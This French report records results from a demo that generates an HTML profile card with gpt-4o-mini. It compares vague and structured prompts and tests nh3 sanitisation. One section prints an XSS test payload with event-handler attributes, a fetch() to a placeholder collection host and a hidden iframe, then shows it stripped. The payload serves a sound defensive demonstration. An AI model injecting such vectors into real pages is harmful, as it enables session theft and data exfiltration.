# Volet 1 - observations

Tous les chiffres de ce document ont été relevés à l'exécution des trois
commandes. Aucun n'est une illustration.

Modèle interrogé : `gpt-4o-mini` via le SDK `openai`, base `https://api.openai.com/v1`.
Clé `OPENAI_API_KEY` lue dans le fichier `.env` de la racine du dépôt.

## Les deux prompts

### Prompt vague (démonstration `libre`)

```
Crée une carte de profil utilisateur
```

Trois appels, à la température par défaut, ont produit trois cartes
différentes :

- appel 1 : un titre `h2`, une photo `https://via.placeholder.com/150`,
  deux boutons, `Suivre` et `Message` ;
- appel 2 : un `h1` et un `h2`, la même photo placeholder en 150 px,
  les deux mêmes boutons ;
- appel 3 : aucun bouton, un lien `Voir le profil`, et une photo pointant
  vers un fichier local inexistant, `profile.jpg`.

Le nombre de boutons n'a jamais été celui de la démonstration suivante, et
il n'a pas été le même d'un appel à l'autre. La photo, le titre et les
actions changent à chaque appel : rien n'ancre ces choix, rien ne les
reproduit.

### Prompt structuré (démonstrations `structure` et `valider`)

```
Génère uniquement le code HTML et CSS (dans une seule balise <style>)
d'une carte de profil utilisateur avec :
- une photo circulaire (placeholder 80x80px)
- un nom et un poste sur deux lignes
- trois boutons alignés horizontalement : Suivre, Message, Bloquer
- une bordure arrondie et une ombre légère
Ne génère aucun texte d'explication, uniquement le code.
```

À température 0, ce prompt a produit la carte attendue : une image de
80 x 80 px arrondie à 50 %, un `h2` pour le nom et un `p` pour le poste,
trois boutons `Suivre`, `Message` et `Bloquer` dans un conteneur en
`display: flex`, un `border-radius: 15px` et un `box-shadow` sur la carte.

Les contraintes de format sont portées par le prompt système, identique dans
les deux démonstrations. C'est pour cette raison que le prompt vague, lui
aussi, a rendu du code nu : ce qui varie sans contraintes, c'est le contenu,
pas la forme.

## Comparaison des deux premières démonstrations

| Critère | Démonstration 1, prompt vague | Démonstration 2, prompt structuré |
| --- | --- | --- |
| Structure respectée | Non. 5 critères sur 6 tenus aux trois appels ; « exactement trois boutons » n'a jamais été tenu | Oui. 6 critères sur 6, affichés `oui` |
| Texte parasite autour du code | Aucun aux trois appels. Aucune clôture markdown, chaque sortie commence par `<` | Aucun. La sortie commence par `<` |
| HTML valide | Oui. Aucune balise jamais fermée, aucune balise fermée sans ouverture sur les trois appels | Oui. Aucune balise jamais fermée, aucune fermée sans ouverture |
| Reproductibilité sur trois appels | Non. Trois balisages différents, trois tailles différentes | Le balisage est identique aux trois appels. Le CSS a varié entre le premier appel et les deux suivants |

## Chiffres relevés

### Démonstration `libre`, température par défaut

| Appel | Tokens | Taille | Critères non tenus |
| --- | --- | --- | --- |
| 1 | 452 | 1429 caractères | exactement trois boutons |
| 2 | 475 | 1327 caractères | exactement trois boutons |
| 3 | 476 | 1350 caractères | exactement trois boutons |

### Démonstration `structure`, température 0

Trois appels du prompt structuré ont été observés : deux par la commande
`structure`, un par la commande `valider`.

| Appel | Tokens | Taille |
| --- | --- | --- |
| 1 | 532 | 1371 caractères |
| 2 | 530 | 1359 caractères |
| 3 | 530 | 1359 caractères |

Aucun critère non tenu, aux trois appels.

Les appels 2 et 3 sont identiques caractère pour caractère. L'appel 1 en
diffère par quatre déclarations CSS, et par elles seules :
`background-color: white` au lieu de `#fff`, `color: gray` au lieu de
`#777`, `padding: 10px` au lieu de `padding: 8px 12px`, et `flex: 1;
margin: 0 5px` au lieu de `font-size: 14px`. Le balisage HTML, lui, est
identique aux trois appels. Température 0 n'a donc pas rendu la sortie
strictement constante ; elle a stabilisé la structure, pas chaque valeur.

### Démonstration `valider`

| Étape | Avant | Après |
| --- | --- | --- |
| Retrait de la clôture markdown | 1359 caractères | 1359 caractères |
| Assainissement du code généré | 1359 caractères | 1359 caractères |
| Assainissement de la charge d'injection | 263 caractères | 81 caractères |

Aucune clôture markdown n'est apparue lors de cette exécution : le nettoyage
n'a rien eu à retirer. Il reste nécessaire, la consigne du prompt système
réduisant ce comportement sans le supprimer.

Vérification des balises sur le code généré : aucune balise jamais fermée,
aucune balise fermée sans avoir été ouverte.

L'assainissement du code généré n'a coûté aucun caractère. La balise
`<style>` et ses 42 lignes de CSS ont traversé intactes, `border-radius` et
`box-shadow` compris.

## Le avant / après de la charge d'injection

Avant, 263 caractères :

```html
<div class="carte"><img src="avatar.png" alt="avatar" onerror="alert('vol de session')"><p onmouseover="fetch('https://exemple.invalid/collecte')">Camille Dupont</p><iframe src="https://exemple.invalid/piege"></iframe><script>alert('charge inerte')</script></div>
```

Après, 81 caractères :

```html
<div class="carte"><img src="avatar.png" alt="avatar"><p>Camille Dupont</p></div>
```

L'attribut `onerror`, l'attribut `onmouseover`, l'`iframe` et le `script` ont
disparu. Le contenu légitime, la division, l'image et le nom, est resté.

Les deux vecteurs qui comptent sont les attributs d'événement et l'`iframe` :
ce sont eux qui s'exécutent quand du code est injecté dans une page déjà
chargée. La balise `<script>`, dans ce cas, ne s'exécuterait pas. Un filtre
maison qui ne retirerait que `<script>` laisserait donc passer la totalité de
l'attaque.

## Corrections apportées

Aucune correction manuelle n'a été apportée au code généré. Les cinq fichiers
de `sortie/` sont ce que le modèle a produit, à l'assainissement près pour
`etape3-assaini.html`.

Trois corrections ont porté sur l'environnement et sur le script :

1. `uv init --bare` a rattaché ce dossier au workspace uv de la racine du
   dépôt. L'environnement a été créé à la racine au lieu de ce dossier, et le
   `uv sync` suivant a désinstallé les dépendances des autres démonstrations
   du dépôt. Le dossier a été exclu du workspace dans le `pyproject.toml` de
   la racine, ce qui lui rend son propre `.venv/`, et l'environnement de la
   racine a été réinstallé.

2. Aucun fichier `.env` n'existe dans `demos/`, et aucune variable
   `OPENROUTER_API_KEY` n'est définie nulle part dans le dépôt ni dans
   l'environnement. La seule clé disponible est `OPENAI_API_KEY`, dans le
   `.env` de la racine du dépôt. Le script interroge donc l'API OpenAI
   directement, avec le modèle `gpt-4o-mini`, et cherche la clé dans
   l'environnement puis dans ce seul fichier.

3. La configuration par défaut de `nh3` vide le contenu de `<style>` en même
   temps que celui de `<script>`, ce qui aurait effacé tout le CSS généré.
   Seul `<script>` est déclaré dans `clean_content_tags`. Sans cela,
   l'assainissement du code généré ne serait pas passé de 1359 à 1359
   caractères.
